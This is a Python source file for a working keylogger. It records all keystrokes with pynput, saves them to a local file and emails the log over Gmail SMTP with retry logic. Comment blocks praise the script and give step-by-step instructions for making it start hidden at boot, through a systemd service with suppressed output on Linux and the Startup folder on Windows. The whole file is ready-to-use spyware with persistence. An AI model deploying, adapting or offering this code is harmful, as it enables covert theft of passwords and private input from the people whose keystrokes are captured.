from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
import time
import os

# Email configuration
EMAIL_ADDRESS = 'your-email@gmail.com'
EMAIL_PASSWORD = 'your-app-password'
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587

log_content = ''
log_file = 'keylog.txt'

def send_email(log_content):
    # Retry logic in case of SMTP failure
    attempts = 3  # Maximum number of retry attempts
    for attempt in range(attempts):
        try:
            msg = MIMEText(log_content)
            msg['Subject'] = 'Keylogger Logs'
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = EMAIL_ADDRESS

            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
            print("Email sent successfully.")
            break  # Exit the loop if email was sent successfully
        except Exception as e:
            print(f"Failed to send email (Attempt {attempt + 1}/{attempts}): {e}")
            time.sleep(10)  # Wait before retrying
            if attempt == attempts - 1:  # After final attempt, log the failure
                print("Maximum retry attempts reached. Email not sent.")

def on_press(key):
    global log_content
    try:
        log_content += f'{key.char}'
    except AttributeError:
        if key == Key.space:
            log_content += ' '
        elif key == Key.backspace:
            log_content += ' [BACKSPACE]'
        elif key == Key.enter:
            log_content += '\n'
        elif hasattr(key, 'name'):  # Fallback for keys with 'name' attribute
            log_content += f' [{key.name}]'

    # Save keystrokes immediately to avoid loss
    with open(log_file, 'a') as f:
        f.write(log_content)

def on_release(key):
    global log_content
    if key == Key.esc:
        # Send the email with the logged content
        send_email(log_content)
        log_content = ''  # Clear logs after sending
        # Clear the log file after sending
        with open(log_file, 'w') as f:
            f.truncate(0)
        print("Log file cleared.")
        return False  # Stop listener

def main():
    global log_content
    # Load previous logs if any
    if os.path.exists(log_file):
        with open(log_file, 'r') as f:
            log_content = f.read()

    while True:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        # Wait before restarting the listener
        time.sleep(5)

if __name__ == '__main__':
    main()

'''
### Recommendation: 

    Use an App-Specific Password:

        -- If your Google account has 2-Step Verification enabled, you must create an App Password:

                1. Go to Google Account Security.
                2. Enable 2-Step Verification if not already done.
                3. Under "Signing in to Google," select App Passwords.
                4. Generate a new app password for your script and use it instead of your main account password.
'''


'''
Keylogger Script:

This Python script is well-optimized, including:

    1. Retry Logic:

            Retries email sending up to 3 times on failure, with a 10-second delay.

    2. Log File Management:

            Clears the keylog.txt file after successful email delivery to prevent old logs from accumulating.
    3. Error Handling:

            Provides clear error messages for failures, making it easier to debug issues.

    4. Execution Flow:

        -- Listens to keypresses and saves logs incrementally. On ESC key press:

                -- Sends email with the log.
                -- Clears log content and file.
                -- Stops the keylogger process.
'''

# The email will be sent when the ESC key is pressed

'''
Start the keylogger.py automatically when the OS is started.

A). Linux Setup (Systemd):

    Using Systemd (for better management)

    You can create a systemd service to automatically run the script at startup.

        1. Create a systemd service file for your script. Open the terminal and create the service file using a text editor:
            
                sudo nano /etc/systemd/system/keylogger.service
        
        2. Add the following content to the keylogger.service file:
            
                [Unit]
                Description=Keylogger Script
                After=multi-user.target

                [Service]
                ExecStart=/usr/bin/python3 /home/sagar-biswas/MEDIA/Programming --Learning/NEW_PY/CyberSecurity/Public/keylogger.py
                WorkingDirectory=/home/sagar-biswas/MEDIA/Programming --Learning/NEW_PY/CyberSecurity/Public
                StandardOutput=null
                StandardError=null
                Restart=always

                [Install]
                WantedBy=multi-user.target


        -- Replace /home/sagar-biswas/MEDIA/Programming --Learning/NEW_PY/CyberSecurity/Public/keylogger.py with the actual path to your script.
        -- Replace /path/to/your/directory with the directory where your script is located.
        -- StandardOutput=null and StandardError=null will suppress the output, so it doesn't log to the console.

        3. Reload the systemd manager configuration to recognize the new service:

                sudo systemctl daemon-reload
        
        4. Enable the service to start on boot:

                sudo systemctl enable keylogger.service

        5. Start the service to run immediately without rebooting:

                sudo systemctl start keylogger.service

        6. Check the status of the service to make sure it's running properly:
        
                sudo systemctl status keylogger.service

        If everything is set up correctly, the script should run automatically when the system starts.



..:: Aditional Information:

    1. Restart the Service:

        To restart the service (useful if you've updated the script or need to reset its state):

                sudo systemctl restart keylogger.service

    2. Disable the Service:

        If you want to prevent the service from starting automatically at boot:

                sudo systemctl disable keylogger.service

B). For Windows:

    If you're working on a Windows machine (or dual-boot setup), you can add the script to the Startup folder:

        1. Press Win + R to open the Run dialog and type shell:startup, then press Enter. This will open the Startup folder.

        2. Create a shortcut of your keylogger.py script inside this folder:

            -- Right-click inside the folder and select New > Shortcut.

            -- In the "Type the location of the item" field, enter the path to your Python executable followed by the path to the keylogger.py script. For example:
            
                    C:\Python39\python.exe C:\path\to\keylogger.py

        3. The script will now run automatically when you log in to Windows.

'''
